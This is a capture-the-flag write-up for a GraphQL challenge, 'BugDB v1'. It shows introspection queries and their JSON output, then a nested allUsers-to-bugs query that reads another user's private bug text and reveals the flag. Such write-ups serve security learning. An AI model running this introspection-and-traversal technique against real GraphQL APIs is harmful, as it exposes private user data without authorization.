# BugDB v1

> Web, GraphQL

An interface is given, which allows us to execute graphql queries and displays its response

## Introspection queries

### Enumerate available schema types

```graphql
{
  __schema {
    types {
      name
      kind
    }
  }
}
```

```json
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "kind": "OBJECT"
        },
        {
          "name": "Node",
          "kind": "INTERFACE"
        },
        {
          "name": "ID",
          "kind": "SCALAR"
        },
        {
          "name": "UsersConnection",
          "kind": "OBJECT"
        },
        {
          "name": "PageInfo",
          "kind": "OBJECT"
        },
        {
          "name": "Boolean",
          "kind": "SCALAR"
        },
        {
          "name": "String",
          "kind": "SCALAR"
        },
        {
          "name": "UsersEdge",
          "kind": "OBJECT"
        },
        {
          "name": "Users",
          "kind": "OBJECT"
        },
        {
          "name": "Bugs_Connection",
          "kind": "OBJECT"
        },
        {
          "name": "Bugs_Edge",
          "kind": "OBJECT"
        },
        {
          "name": "Bugs_",
          "kind": "OBJECT"
        },
        {
          "name": "Int",
          "kind": "SCALAR"
        },
        {
          "name": "BugsConnection",
          "kind": "OBJECT"
        },
        {
          "name": "BugsEdge",
          "kind": "OBJECT"
        },
        {
          "name": "Bugs",
          "kind": "OBJECT"
        },
        {
          "name": "__Schema",
          "kind": "OBJECT"
        },
        {
          "name": "__Type",
          "kind": "OBJECT"
        },
        {
          "name": "__TypeKind",
          "kind": "ENUM"
        },
        {
          "name": "__Field",
          "kind": "OBJECT"
        },
        {
          "name": "__InputValue",
          "kind": "OBJECT"
        },
        {
          "name": "__EnumValue",
          "kind": "OBJECT"
        },
        {
          "name": "__Directive",
          "kind": "OBJECT"
        },
        {
          "name": "__DirectiveLocation",
          "kind": "ENUM"
        }
      ]
    }
  }
}
```

### Query Discovery

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "node",
            "args": [
              {
                "name": "id",
                "type": {
                  "name": null,
                  "kind": "NON_NULL",
                  "ofType": {
                    "name": "ID",
                    "kind": "SCALAR"
                  }
                }
              }
            ]
          },
          {
            "name": "user",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "bug",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "findUser",
            "args": [
              {
                "name": "username",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "findBug",
            "args": [
              {
                "name": "_",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "allUsers",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          },
          {
            "name": "allBugs",
            "args": [
              {
                "name": "before",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "after",
                "type": {
                  "name": "String",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "first",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              },
              {
                "name": "last",
                "type": {
                  "name": "Int",
                  "kind": "SCALAR",
                  "ofType": null
                }
              }
            ]
          }
        ]
      }
    }
  }
}
```

### Enumerate the fields of a type and their nested type information

```graphql
{
  __type(name: "Bugs_") {
    name
    fields {
      name
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "__type": {
      "name": "Bugs_",
      "fields": [
        {
          "name": "id",
          "type": {
            "name": null,
            "kind": "NON_NULL",
            "ofType": {
              "name": "ID",
              "kind": "SCALAR"
            }
          }
        },
        {
          "name": "reporterId",
          "type": {
            "name": "Int",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "text",
          "type": {
            "name": "String",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "private",
          "type": {
            "name": "Boolean",
            "kind": "SCALAR",
            "ofType": null
          }
        },
        {
          "name": "reporter",
          "type": {
            "name": "Users",
            "kind": "OBJECT",
            "ofType": null
          }
        }
      ]
    }
  }
}
```

## What to do

The `text` field in `Bugs_` seems interesting, but the `allBugs()` function returns `BugsConnection`, not `Bugs_`:

```graphql
query {
  allBugs(first: 10) {
    edges {
      node {
        id
        reporterId
        private
        reporter {
          id
          username
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "allBugs": {
      "edges": [
        {
          "node": {
            "id": "QnVnczox",
            "reporterId": 1,
            "private": false,
            "reporter": {
              "id": "VXNlcnM6MQ==",
              "username": "admin"
            }
          }
        },
        {
          "node": {
            "id": "QnVnczoy",
            "reporterId": 2,
            "private": true,
            "reporter": {
              "id": "VXNlcnM6Mg==",
              "username": "victim"
            }
          }
        }
      ]
    }
  }
}
```

Base64-decoding the strings doesn't yield useful information. `findBug` function returns `Bugs_` object but its expected argument is not known; we need to find some other way to get a `Bugs_` object in response

On introspecting fields of various schemas:

```text
UsersConnection
    - UsersEdge
        - Users
            - Bugs_Connection
                - Bugs_Edge
                 - Bugs_
```

```graphql
query {
  allUsers(first: 2) {
    edges {
      node {
        id
        username
        bugs {
          edges {
            node {
              id
              reporterId
              text
              private
            }
          }
        }
      }
    }
  }
}
```

```json
{
  "data": {
    "allUsers": {
      "edges": [
        {
          "node": {
            "id": "VXNlcnM6MQ==",
            "username": "admin",
            "bugs": {
              "edges": [
                {
                  "node": {
                    "id": "QnVnc186MQ==",
                    "reporterId": 1,
                    "text": "This is an example bug",
                    "private": false
                  }
                }
              ]
            }
          }
        },
        {
          "node": {
            "id": "VXNlcnM6Mg==",
            "username": "victim",
            "bugs": {
              "edges": [
                {
                  "node": {
                    "id": "QnVnc186Mg==",
                    "reporterId": 2,
                    "text": "^FLAG^51e11eedd191aca15d86bb580c57fc3f15c48c43f58ceed600a37bd6d46058a7$FLAG$",
                    "private": true
                  }
                }
              ]
            }
          }
        }
      ]
    }
  }
}
```
